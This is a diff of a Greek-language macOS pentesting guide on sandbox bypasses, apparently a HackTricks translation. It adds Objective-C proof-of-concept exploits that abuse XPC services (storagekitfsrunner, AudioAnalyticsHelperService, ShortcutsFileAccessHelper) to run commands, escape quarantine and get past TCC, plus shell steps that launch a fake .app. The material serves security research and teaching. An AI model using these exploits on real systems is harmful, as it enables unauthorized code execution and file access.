@@ -10,7 +10,7 @@
 
 Ο μεταγλωττιστής θα συνδέσει το `/usr/lib/libSystem.B.dylib` με το δυαδικό αρχείο.
 
-Στη συνέχεια, **`libSystem.B`** θα καλεί άλλες πολλές συναρτήσεις μέχρι το **`xpc_pipe_routine`** να στείλει τις εξουσιοδοτήσεις της εφαρμογής στο **`securityd`**. Το Securityd ελέγχει αν η διαδικασία θα πρέπει να είναι σε καραντίνα μέσα στο Sandbox, και αν ναι, θα μπει σε καραντίνα.\
+Στη συνέχεια, **`libSystem.B`** θα καλεί άλλες πολλές συναρτήσεις μέχρι να στείλει η **`xpc_pipe_routine`** τις εξουσιοδοτήσεις της εφαρμογής στο **`securityd`**. Το Securityd ελέγχει αν η διαδικασία θα πρέπει να είναι σε καραντίνα μέσα στο Sandbox, και αν ναι, θα μπει σε καραντίνα.\
 Τέλος, το sandbox θα ενεργοποιηθεί με μια κλήση στο **`__sandbox_ms`** που θα καλέσει το **`__mac_syscall`**.
 
 ## Possible Bypasses
@@ -24,7 +24,7 @@
 > [!CAUTION]
 > Επομένως, αυτή τη στιγμή, αν είστε απλώς ικανοί να δημιουργήσετε έναν φάκελο με όνομα που τελειώνει σε **`.app`** χωρίς το quarantine attribute, μπορείτε να διαφύγετε από το sandbox γιατί το macOS μόνο **ελέγχει** το **quarantine** attribute στον **φάκελο `.app`** και στο **κύριο εκτελέσιμο** (και θα δείξουμε το κύριο εκτελέσιμο στο **`/bin/bash`**).
 >
-> Σημειώστε ότι αν ένα πακέτο .app έχει ήδη εξουσιοδοτηθεί να εκτελείται (έχει ένα quarantine xttr με την εξουσιοδότηση να εκτελείται), θα μπορούσατε επίσης να το εκμεταλλευτείτε... εκτός αν τώρα δεν μπορείτε να γράψετε μέσα σε **`.app`** πακέτα εκτός αν έχετε κάποιες προνομιακές άδειες TCC (που δεν θα έχετε μέσα σε ένα sandbox υψηλής ασφάλειας).
+> Σημειώστε ότι αν ένα πακέτο .app έχει ήδη εξουσιοδοτηθεί να εκτελείται (έχει ένα quarantine xttr με την εξουσιοδότηση να εκτελείται), μπορείτε επίσης να το εκμεταλλευτείτε... εκτός αν τώρα δεν μπορείτε να γράψετε μέσα σε **`.app`** πακέτα εκτός αν έχετε κάποιες προνομιακές άδειες TCC (που δεν θα έχετε μέσα σε ένα sandbox υψηλής ασφάλειας).
 
 ### Abusing Open functionality
 
@@ -37,7 +37,7 @@ macos-office-sandbox-bypasses.md
 ### Launch Agents/Daemons
 
 Ακόμα και αν μια εφαρμογή είναι **σχεδιασμένη να είναι σε sandbox** (`com.apple.security.app-sandbox`), είναι δυνατόν να παρακαμφθεί το sandbox αν εκτελείται από έναν LaunchAgent (`~/Library/LaunchAgents`) για παράδειγμα.\
-Όπως εξηγήθηκε σε [**αυτή την ανάρτηση**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), αν θέλετε να αποκτήσετε επιμονή με μια εφαρμογή που είναι σε sandbox, θα μπορούσατε να την κάνετε να εκτελείται αυτόματα ως LaunchAgent και ίσως να εισάγετε κακόβουλο κώδικα μέσω μεταβλητών περιβάλλοντος DyLib.
+Όπως εξηγήθηκε σε [**αυτή την ανάρτηση**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), αν θέλετε να αποκτήσετε επιμονή με μια εφαρμογή που είναι σε sandbox μπορείτε να την κάνετε να εκτελείται αυτόματα ως LaunchAgent και ίσως να εισάγετε κακόβουλο κώδικα μέσω μεταβλητών περιβάλλοντος DyLib.
 
 ### Abusing Auto Start Locations
 
@@ -59,23 +59,184 @@ macos-office-sandbox-bypasses.md
 ../../../macos-proces-abuse/
 {{#endref}}
 
-### Static Compiling & Dynamically linking
+### Available System and User Mach services
 
-[**Αυτή η έρευνα**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ανακάλυψε 2 τρόπους για να παρακαμφθεί το Sandbox. Επειδή το sandbox εφαρμόζεται από το userland όταν φορτώνεται η βιβλιοθήκη **libSystem**. Αν ένα δυαδικό αρχείο μπορούσε να αποφύγει τη φόρτωσή του, δεν θα μπήκε ποτέ σε sandbox:
+Το sandbox επιτρέπει επίσης την επικοινωνία με ορισμένες **Mach υπηρεσίες** μέσω XPC που ορίζονται στο προφίλ `application.sb`. Αν μπορείτε να **εκμεταλλευτείτε** μία από αυτές τις υπηρεσίες, μπορεί να είστε σε θέση να **διαφύγετε από το sandbox**.
 
-- Αν το δυαδικό αρχείο ήταν **εντελώς στατικά μεταγλωττισμένο**, θα μπορούσε να αποφύγει τη φόρτωση αυτής της βιβλιοθήκης.
-- Αν το **δυαδικό αρχείο δεν χρειαζόταν να φορτώσει καμία βιβλιοθήκη** (επειδή ο σύνδεσμος είναι επίσης στη libSystem), δεν θα χρειαστεί να φορτώσει τη libSystem.
+Όπως αναφέρεται σε [αυτή την ανάλυση](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), οι πληροφορίες σχετικά με τις Mach υπηρεσίες αποθηκεύονται στο `/System/Library/xpc/launchd.plist`. Είναι δυνατόν να βρείτε όλες τις Mach υπηρεσίες του Συστήματος και του Χρήστη αναζητώντας μέσα σε αυτό το αρχείο για `<string>System</string>` και `<string>User</string>`.
+
+Επιπλέον, είναι δυνατόν να ελέγξετε αν μια Mach υπηρεσία είναι διαθέσιμη σε μια εφαρμογή που είναι σε sandbox καλώντας το `bootstrap_look_up`:
+```objectivec
+void checkService(const char *serviceName) {
+mach_port_t service_port = MACH_PORT_NULL;
+kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
+if (!err) {
+NSLog(@"available service:%s", serviceName);
+mach_port_deallocate(mach_task_self_, service_port);
+}
+}
+
+void print_available_xpc(void) {
+NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
+NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
+for (NSString* key in launchDaemons) {
+NSDictionary<NSString*, id>* job = launchDaemons[key];
+NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
+for (NSString* serviceName in machServices) {
+checkService(serviceName.UTF8String);
+}
+}
+}
+```
+### Διαθέσιμες υπηρεσίες PID Mach
+
+Αυτές οι υπηρεσίες Mach χρησιμοποιήθηκαν αρχικά για να [ξεφύγουν από το sandbox σε αυτή την αναφορά](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Μέχρι τότε, **όλες οι υπηρεσίες XPC που απαιτούνταν** από μια εφαρμογή και το πλαίσιο της ήταν ορατές στο πεδίο PID της εφαρμογής (αυτές είναι οι υπηρεσίες Mach με `ServiceType` ως `Application`).
+
+Για να **επικοινωνήσετε με μια υπηρεσία XPC του PID Domain**, χρειάζεται απλώς να την καταχωρίσετε μέσα στην εφαρμογή με μια γραμμή όπως:
+```objectivec
+[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
+```
+Επιπλέον, είναι δυνατόν να βρείτε όλες τις **Application** Mach υπηρεσίες αναζητώντας μέσα στο `System/Library/xpc/launchd.plist` για `<string>Application</string>`.
+
+Ένας άλλος τρόπος για να βρείτε έγκυρες xpc υπηρεσίες είναι να ελέγξετε αυτές που βρίσκονται σε:
+```bash
+find /System/Library/Frameworks -name "*.xpc"
+find /System/Library/PrivateFrameworks -name "*.xpc"
+```
+Μερικά παραδείγματα που εκμεταλλεύονται αυτή την τεχνική μπορούν να βρεθούν στην [**πρωτότυπη αναφορά**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), ωστόσο, τα παρακάτω είναι μερικά συνοπτικά παραδείγματα.
+
+#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
+
+Αυτή η υπηρεσία επιτρέπει κάθε σύνδεση XPC επιστρέφοντας πάντα `YES` και η μέθοδος `runTask:arguments:withReply:` εκτελεί μια αυθαίρετη εντολή με αυθαίρετες παραμέτρους.
+
+Η εκμετάλλευση ήταν "τόσο απλή όσο":
+```objectivec
+@protocol SKRemoteTaskRunnerProtocol
+-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
+@end
+
+void exploit_storagekitfsrunner(void) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
+[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
+[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
+[conn resume];
+
+[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
+NSLog(@"run task result:%@, error:%@", bSucc, error);
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
+
+Αυτή η υπηρεσία XPC επέτρεπε σε κάθε πελάτη επιστρέφοντας πάντα ΝΑΙ και η μέθοδος `createZipAtPath:hourThreshold:withReply:` ουσιαστικά επέτρεπε να υποδειχθεί η διαδρομή σε έναν φάκελο προς συμπίεση και θα τον συμπίεζε σε ένα αρχείο ZIP.
+
+Επομένως, είναι δυνατό να δημιουργηθεί μια ψεύτικη δομή φακέλου εφαρμογής, να συμπιεστεί, στη συνέχεια να αποσυμπιεστεί και να εκτελεστεί για να ξεφύγει από το sandbox καθώς τα νέα αρχεία δεν θα έχουν το χαρακτηριστικό καραντίνας.
+
+Η εκμετάλλευση ήταν:
+```objectivec
+@protocol AudioAnalyticsHelperServiceProtocol
+-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+@end
+void exploit_AudioAnalyticsHelperService(void) {
+NSString *currentPath = NSTemporaryDirectory();
+chdir([currentPath UTF8String]);
+NSLog(@"======== preparing payload at the current path:%@", currentPath);
+system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
+[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
+system("chmod +x compressed/poc.app/Contents/MacOS/poc");
+
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
+[conn resume];
+
+[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
+NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
+NSString *file;
+while ((file = [dirEnum nextObject])) {
+if ([[file pathExtension] isEqualToString: @"zip"]) {
+// open the zip
+NSString *cmd = [@"open " stringByAppendingString:file];
+system([cmd UTF8String]);
+
+sleep(3); // wait for decompression and then open the payload (poc.app)
+NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
+system([cmd2 UTF8String]);
+break;
+}
+}
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
+
+Αυτή η υπηρεσία XPC επιτρέπει την παροχή δικαιωμάτων ανάγνωσης και εγγραφής σε μια αυθαίρετη διεύθυνση URL στον πελάτη XPC μέσω της μεθόδου `extendAccessToURL:completion:` που δέχεται οποιαδήποτε σύνδεση. Καθώς η υπηρεσία XPC έχει FDA, είναι δυνατόν να καταχραστούν αυτά τα δικαιώματα για να παρακαμφθεί εντελώς το TCC.
+
+Η εκμετάλλευση ήταν:
+```objectivec
+@protocol WFFileAccessHelperProtocol
+- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
+@end
+typedef int (*PFN)(const char *);
+void expoit_ShortcutsFileAccessHelper(NSString *target) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
+[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
+[conn resume];
+
+[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
+NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
+NSURL *targetURL = [fpWrapper url];
+
+void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
+PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
+if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
+NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
+else {
+NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
+NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
+}
+}];
+}
+```
+### Στατική Συγκέντρωση & Δυναμική Σύνδεση
+
+[**Αυτή η έρευνα**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ανακάλυψε 2 τρόπους για να παρακαμφθεί το Sandbox. Επειδή το sandbox εφαρμόζεται από το userland όταν η βιβλιοθήκη **libSystem** φορτώνεται. Αν ένα δυαδικό αρχείο μπορούσε να αποφύγει τη φόρτωσή του, δεν θα υποβαλλόταν ποτέ σε sandbox:
+
+- Αν το δυαδικό αρχείο ήταν **εντελώς στατικά συγκεντρωμένο**, θα μπορούσε να αποφύγει τη φόρτωση αυτής της βιβλιοθήκης.
+- Αν το **δυαδικό αρχείο δεν χρειαζόταν να φορτώσει καμία βιβλιοθήκη** (επειδή ο σύνδεσμος είναι επίσης στο libSystem), δεν θα χρειαστεί να φορτώσει το libSystem.
 
 ### Shellcodes
 
-Σημειώστε ότι **ακόμα και οι shellcodes** σε ARM64 χρειάζονται να συνδεθούν στη `libSystem.dylib`:
+Σημειώστε ότι **ακόμα και τα shellcodes** σε ARM64 χρειάζονται να συνδεθούν στο `libSystem.dylib`:
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-### Entitlements
+### Όχι κληρονομούμενοι περιορισμοί
 
-Σημειώστε ότι ακόμη και αν ορισμένες **ενέργειες** μπορεί να είναι **επιτρεπτές από το sandbox** αν μια εφαρμογή έχει μια συγκεκριμένη **δικαιοδοσία**, όπως στο:
+Όπως εξηγείται στο **[bonus of this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, ένας περιορισμός sandbox όπως:
+```
+(version 1)
+(allow default)
+(deny file-write* (literal "/private/tmp/sbx"))
+```
+μπορεί να παρακαμφθεί από μια νέα διαδικασία που εκτελείται για παράδειγμα:
+```bash
+mkdir -p /tmp/poc.app/Contents/MacOS
+echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
+chmod +x /tmp/poc.app/Contents/MacOS/poc
+open /tmp/poc.app
+```
+Ωστόσο, φυσικά, αυτή η νέα διαδικασία δεν θα κληρονομήσει δικαιώματα ή προνόμια από τη γονική διαδικασία.
+
+### Δικαιώματα
+
+Σημειώστε ότι ακόμη και αν ορισμένες **ενέργειες** μπορεί να είναι **επιτρεπτές από το sandbox** αν μια εφαρμογή έχει ένα συγκεκριμένο **δικαίωμα**, όπως στο:
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
